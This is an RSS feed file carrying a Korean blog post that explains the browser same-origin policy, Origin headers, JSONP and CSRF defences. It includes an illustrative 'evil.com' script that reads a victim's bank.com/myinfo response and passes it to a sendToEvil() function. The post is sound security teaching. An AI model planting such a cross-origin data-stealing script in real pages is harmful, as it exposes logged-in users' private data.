@@ -1,0 +1,156 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Origin on True Alarm</title>
+        <link>https://truealarm.github.io/tags/origin/</link>
+        <description>Recent content in Origin on True Alarm</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <lastBuildDate>Wed, 21 Dec 2022 02:05:26 +0900</lastBuildDate><atom:link href="https://truealarm.github.io/tags/origin/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Misunderstood of same-origin policy</title>
+        <link>https://truealarm.github.io/p/misunderstood-of-same-origin-policy/</link>
+        <pubDate>Wed, 21 Dec 2022 02:05:26 +0900</pubDate>
+        
+        <guid>https://truealarm.github.io/p/misunderstood-of-same-origin-policy/</guid>
+        <description>&lt;p&gt;Same-origin policy는 인터넷 브라우저와 같이 http 서버와 통신하는 웹 애플리케이션이 사용하는 보안 정책의 한 종류이다. 현대의 브라우저라면 필수적으로 적용하는 정책으로, 웹 페이지에서 스크립트를 통해 다른 웹 페이지의 컨텐츠를 읽을 때 Origin이 같은 경우만 허용하는 정책이다.&lt;/p&gt;
+&lt;h2 id=&#34;the-origin&#34;&gt;The Origin&lt;/h2&gt;
+&lt;p&gt;한국어로 기원, 근원을 의미하는 Origin이라는 단어는 Same-origin policy에서 정확히 어떤 의미를 사용되고, 왜 필요한건지 알 필요가 있다.&lt;/p&gt;
+&lt;p&gt;기본적으로 HTTP 프로토콜로 통신하는 클라이언트와 서버는 매 연결마다 새로운 연결을 시도한다. 때문에 웹 사이트에 로그인한 유저의 상태를 계속 유지하는 것처럼, 이전 HTTP 요청에 대한 정보를 유지하고 싶으면 Cookie에 세션 아이디를 저장하는 방식을 사용할 수 있다.&lt;/p&gt;
+&lt;p&gt;브라우저는 스크립트를 통해 시작된 HTTP 요청에도 Cookie를 리퀘스트 헤더에 포함하고, Cookie에는 세션 정보를 포함하고 있으므로, 서버는 로그인한 유저라고 간주한 채 요청을 처리하고 리스폰스를 반환한다. 이때 아무런 제약 없이 리스폰스를 읽을 수 있다면, 심각한 보안 위협으로 이어질 수 있다.&lt;/p&gt;
+&lt;p&gt;악의적인 웹 사이트(evil.com)의 운영자가 선량한 웹 사이트의 민감 정보를 반환하는 API(bank.com/myinfo)를 요청하고, 이 결과를 다시 본인의 서버로 전송하는 스크립트(아래 코드 참고)를 웹 사이트에 포함시켜 놓으면, 선량한 웹 사이트에 로그인한 유저가 evil.com에 방문하는 것만으로도 민감 정보가 유출된다.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;&amp;lt;!-- evil.com --&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;xhr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;xhr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;onreadystatechange&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;xhr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;readyState&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;DONE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nx&#34;&gt;sendToEvil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;xhr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;responseText&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;xhr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;GET&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;bank.com/myinfo&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;xhr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;이를 막기 위해 필요한 정보가 Origin이다. Origin은 브라우저가 스크립트를 통해 HTTP 요청을 시작할 때 해당 스크립트가 실행된 장소를 의미한다. 그리고 장소는 schema, hostname, port 정보를 합쳐 표현한다. (i.e., schema://hostname:port)&lt;/p&gt;
+&lt;p&gt;예를 들어 &lt;code&gt;http://www.example.com:8080/hello&lt;/code&gt; 에서 &lt;a class=&#34;link&#34; href=&#34;https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;fetch&lt;/a&gt;로 &lt;code&gt;http://www.naver.com&lt;/code&gt; 사이트를 읽어오면 Origin은 &lt;code&gt;http://www.example.com:8080&lt;/code&gt; 가 되는 것이다. &lt;a class=&#34;link&#34; href=&#34;https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Host&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Host&lt;/a&gt; 혹은 &lt;a class=&#34;link&#34; href=&#34;https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Referer&lt;/a&gt;와 비슷하지만 Host는 schema를 포함하지 않고, Referer는 path까지 포함하는 정보이다.&lt;/p&gt;
+&lt;h2 id=&#34;how-to-work&#34;&gt;How to work&lt;/h2&gt;
+&lt;p&gt;브라우저가 스크립트를 통해 HTTP 요청을 시작할 때 schema, host, port 정보로 Origin을 만들고, 이 정보를 HTTP 요청마다 Origin 헤더로 추가한다. 서버는 요청을 처리한 뒤, 리스폰스 헤더에 해당 Origin이 리스폰스를 읽을 수 있는지 여부를 표시한다. 이후 브라우저에서 리스폰스에 표시가 없다면 스크립트에서 접근을 제한한다.&lt;/p&gt;
+&lt;p&gt;크롬이나 사파리 같은 메이저 브라우저에서 다른 Origin의 웹 사이트를 요청하는 코드를 실행해보면 에러가 반환되는 것을 확인할 수 있다. 서버에서 명시적으로 특정 Origin을 허용하도록 설정해주지 않으면, 리소스에 대한 접근이 불가능한 것이다.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;xhr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;xhr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;GET&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;http://example.com&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;xhr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// Access to XMLHttpRequest at &amp;#39;https://example.com/&amp;#39; from origin &amp;#39;https://stackoverflow.com&amp;#39; has been blocked by CORS policy: No &amp;#39;Access-Control-Allow-Origin&amp;#39; header is present on the requested resource.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// GET https://example.com/ net::ERR_FAILED 200
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;jsonp&#34;&gt;JSONP&lt;/h2&gt;
+&lt;p&gt;Same-origin policy는 스크립트를 통해 생성된 HTTP 요청에만 적용되고, 다른 도메인의 이미지, CSS나 스크립트 파일을 로드하면서 발생하는 HTTP 요청은 해당되지 않는다. 이런 특성은 강제적인 Same-origin policy의 제한을 예외적으로 허용하고 싶을 때, (i.e., 서로 다른 서브 도메인 간 리소스 공유) 활용될 수 있고, 이를 &lt;a class=&#34;link&#34; href=&#34;https://en.wikipedia.org/wiki/JSONP&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;JSONP&lt;/a&gt; (JSON with Padding)라고 부른다.&lt;/p&gt;
+&lt;p&gt;현재의 &lt;a class=&#34;link&#34; href=&#34;https://en.wikipedia.org/wiki/Cross-origin_resource_sharing&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;CORS&lt;/a&gt; (Cross-Origin Resource Sharing)가 널리 사용되기 전인 2005년에 Bob Ippolito에 의해 고안된 방법으로, script의 src에 요청할 다른 도메인의 서버의 주소를 지정하고, 해당 서버에서는 JSON 형식의 리스폰스를 callback 함수의 인자로 호출하는 스크립트 소스 형태로 반환하는 것이다. (아래 코드 참고) 서로 다른 Origin 간 HTTP 요청이지만, 스크립트 로드를 통해 읽어온 데이터이므로 Same-origin policy에 위배되지 않고 Cross-Origin Resource Sharing이 가능하다.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;application/javascript&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;na&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://bank.com/myinfo?callback=checkAccount&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;// Response of http://example.com/myinfo
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;checkAccount({&amp;#34;name&amp;#34;: &amp;#34;Alice&amp;#34;, &amp;#34;id&amp;#34;: 1234});
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;illusions&#34;&gt;Illusions&lt;/h2&gt;
+&lt;h3 id=&#34;cant-we-set-the-origin-header&#34;&gt;Can&amp;rsquo;t we set the Origin header?&lt;/h3&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin#description&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;모질라 문서&lt;/a&gt;에 따르면 브라우저는 아래와 같은 요청에는 무조건 Origin 헤더를 추가한다. 그래서 Origin 헤더를 임의로 설정한 뒤 &lt;a class=&#34;link&#34; href=&#34;https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;XMLHttpRequest&lt;/a&gt;를 실행해도 브라우저가 알아서 덮어씌우므로 변조할 수 없다.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://developer.mozilla.org/en-US/docs/Glossary/CORS&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;cross origin&lt;/a&gt; requests.&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;same-origin&lt;/a&gt; requests except for &lt;a class=&#34;link&#34; href=&#34;https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/GET&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;&lt;code&gt;GET&lt;/code&gt;&lt;/a&gt; or &lt;a class=&#34;link&#34; href=&#34;https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/HEAD&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;&lt;code&gt;HEAD&lt;/code&gt;&lt;/a&gt; requests (i.e. they are added to same-origin &lt;a class=&#34;link&#34; href=&#34;https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/POST&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;&lt;code&gt;POST&lt;/code&gt;&lt;/a&gt;, &lt;a class=&#34;link&#34; href=&#34;https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/OPTIONS&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;&lt;code&gt;OPTIONS&lt;/code&gt;&lt;/a&gt;, &lt;a class=&#34;link&#34; href=&#34;https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/PUT&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;&lt;code&gt;PUT&lt;/code&gt;&lt;/a&gt;, &lt;a class=&#34;link&#34; href=&#34;https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/PATCH&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;&lt;code&gt;PATCH&lt;/code&gt;&lt;/a&gt;, and &lt;a class=&#34;link&#34; href=&#34;https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/DELETE&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;&lt;code&gt;DELETE&lt;/code&gt;&lt;/a&gt; requests).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;h3 id=&#34;-note&#34;&gt;📝 &lt;strong&gt;Note&lt;/strong&gt;&lt;/h3&gt;
+&lt;p&gt;Origin 헤더 말고 스크립트에서 덮어씌울 수 없는 헤더 목록은 &lt;a class=&#34;link&#34; href=&#34;https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Forbidden header name&lt;/a&gt;에서 확인할 수 있다.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Origin 헤더를 추가하는 정책은 &lt;a class=&#34;link&#34; href=&#34;https://www.rfc-editor.org/rfc/rfc6454#section-7.3&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;rfc 문서&lt;/a&gt;의 &amp;ldquo;7.3 User Agent Requirements&amp;rdquo; 부분을 읽어보면 Same-origin policy를 위한 필수적인 요구 사항임을 알 수 있다.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;The user agent MAY include an Origin header field in any HTTP
+request.&lt;/li&gt;
+&lt;li&gt;The user agent MUST NOT include more than one Origin header field in
+any HTTP request.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;물론 Burp Suite 같은 Web proxy를 통해 HTTP 요청을 intercept 한다면 Origin 헤더를 변조할 수 있다. 근데 이런 방식으로 HTTP 요청을 감청하여 Origin을 변경할 수 있는건 MITM이 가능하다는 전제이므로 고려하지 않는다. Same-origin policy는 악성 웹 사이트의 관리자가 스크립트 코드를 통해 다른 웹 사이트의 리소스를 읽을 수 없도록 막아준다. 애초에 MITM이 가능하다면 Origin을 변경하여 Same-origin policy가 우회되는 것은 신경쓰지 않아도 될 정도로 심각한 공격이 가능하다.&lt;/p&gt;
+&lt;h3 id=&#34;can-same-origin-policy-prevent-csrf&#34;&gt;Can same-origin policy prevent CSRF?&lt;/h3&gt;
+&lt;p&gt;Same-origin policy가 &lt;a class=&#34;link&#34; href=&#34;https://owasp.org/www-community/attacks/csrf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;CSRF&lt;/a&gt; 공격까지 막을 수 있을까? 라는 질문에 꽤 많은 사람들이 막을 수 있다고 생각한다. 결론부터 말하면 절반 정도 맞는 말이다. Same-origin policy이 다른 Origin에 대한 HTTP 요청을 막아준다고 착각해서 악의적인 웹 사이트에서 정상적인 웹 사이트로 변조된 요청을 보내는 CSRF 공격을 막을 수 있다고 믿는다.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Same-origin policy는 웹 페이지에서 스크립트를 통해 다른 웹 페이지의 &lt;strong&gt;컨텐츠를 읽을 때&lt;/strong&gt; Origin이 같은 경우만 허용하는 정책이다.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;해당 포스트의 첫 문단에서 설명한 대로 &lt;strong&gt;Same-origin policy는 HTTP 요청을 막는 게 아니라 요청 결과에 접근하지 못하도록 막는 것이다.&lt;/strong&gt; 요청 자체를 막으려면 서버에서 Origin을 확인하고 요청을 거부하거나, 브라우저에서 실제 요청을 보내기 전에 서버에게 허용된 Origin이 맞는지 확인하는 과정이 필요하다.&lt;/p&gt;
+&lt;p&gt;CSRF 공격을 막을 수 있다는 말이 절반정도 맞는 이유는 CSRF를 막기 위해 흔히 사용되는 &lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/csrf/tokens&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;CSRF token&lt;/a&gt; 같은 방어책이 Same-origin policy에 의존하기 때문이다. 서버에서 웹 페이지를 제공하기 전에 랜덤한 값(CSRK token)을 생성하여 유저의 세션에 저장하고, 웹 페이지에 존재하는 input form에 포함시킨 채로 제공한다. 그러면 요청이 전송될 때 토큰이 같이 전송되고 서버에서 세션에 저장된 토큰과 비교하여 위조된 요청인지 확인한다.&lt;/p&gt;
+&lt;p&gt;만약 Same-origin policy가 보장되지 않는다면 공격자는 웹 페이지에 포함되어 있는 토큰 값을 읽을 수 있으니 CSRF 공격을 막을 수 없다.&lt;/p&gt;
+&lt;h3 id=&#34;can-custom-headers-prevent-csrf&#34;&gt;Can custom headers prevent CSRF?&lt;/h3&gt;
+&lt;p&gt;세션 아이디를 Cookie가 아닌 Custom header를 통해 전달하도록 서버를 구성하면 일부 CSRF 공격을 막을 수 있다. 이 방법은 CSRF token 같이 웹 페이지나 세션 정보에 토큰을 저장하지 않는 장점이 있다.&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/setRequestHeader&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;XMLHttpRequest.setRequestHeader&lt;/a&gt; 공식 문서를 참고하면 다른 도메인에 대한 HTTP 요청에 Custom header를 추가하면 Same-origin policy에 의해 요청이 중단된다고 나와있다.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; For your custom fields, you may encounter a &amp;ldquo;&lt;strong&gt;not allowed by Access-Control-Allow-Headers in preflight response&lt;/strong&gt;&amp;rdquo; exception when you send requests across domains. In this situation, you need to set up the &lt;a class=&#34;link&#34; href=&#34;https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Headers&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;&lt;code&gt;Access-Control-Allow-Headers&lt;/code&gt;&lt;/a&gt; in your response header at server side.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;그래서 &lt;code&gt;setRequestHeader(&amp;quot;x-custom-header&amp;quot;, &#39;abc&#39;)&lt;/code&gt;로 헤더를 추가하여 요청을 보내면 OPTIONS 메소드로 먼저 요청을 보내 허용된 Origin인지 확인하는 과정(pre-flight CORS check)이 추가된다. 하지만 XHR이나 AJAX를 사용하는 API 요청에만 적용할 수 있고, form 태그를 통한 요청에는 적용할 수 없다. 그리고 pre-flight CORS check를 위한 CORS 설정도 따로 관리해줘야 하므로 오히려 비용이 증가할 수 있다.&lt;/p&gt;
+&lt;p&gt;물론 Same-origin policy에 의존하지 않는 방법도 있다. Cookie에 samesite 보안 옵션을 추가하면 다른 Origin에서 보낸 HTTP 요청에는 Cookie가 같이 포함되지 않아 CSRF를 막을 수 있고, CAPTCHA 같이 유저 인터랙션을 강제하는 방법으로 막을 수도 있다.&lt;/p&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
